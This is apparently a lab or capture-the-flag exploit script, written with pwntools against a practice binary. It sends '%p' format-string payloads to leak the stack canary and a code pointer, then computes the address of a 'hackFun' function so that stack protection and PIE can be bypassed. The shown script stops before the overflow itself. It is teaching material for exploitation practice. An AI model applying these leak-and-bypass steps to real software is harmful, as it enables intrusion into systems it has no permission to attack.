#!/usr/bin/python3 

# Import everything in the pwntools namespace
from pwn import *
from ast import literal_eval

binary = pwnlib.elf.load('smash_ex.stack-protect.pie.exe')
fun_addr = binary.symbols['hackFun']
print(fun_addr)
hex(fun_addr)

# Create an instance of the process to talk to
io = process('./smash_ex.stack-protect.pie.exe')
#io = gdb.debug('./smash_ex.stack-protect.pie.exe')

# `continue` in the gdb window

# once you get to victim, can view stack in pwngdb or with
# x/16g $rsp
# print out 16 8-byte values starting from rsp register
io.readlines(1)

# %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
io.send('%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p'.encode('utf-8'))

out = io.readlines(2)
print("Captured from program", out[0])

outs = out[0].decode('utf-8').split(' ')
# canary = 0x667a783ed0761900
canary = literal_eval(outs[18])
buf_start = 0x7025207025207025

i = outs.index(str(hex(canary))) - outs.index(str(hex(buf_start)))
# need to dynamically figure this out
fun_addr = (literal_eval(outs[20][:-4]) - 27) + 0xe0
print("Computed fun addr: ", hex(fun_addr))
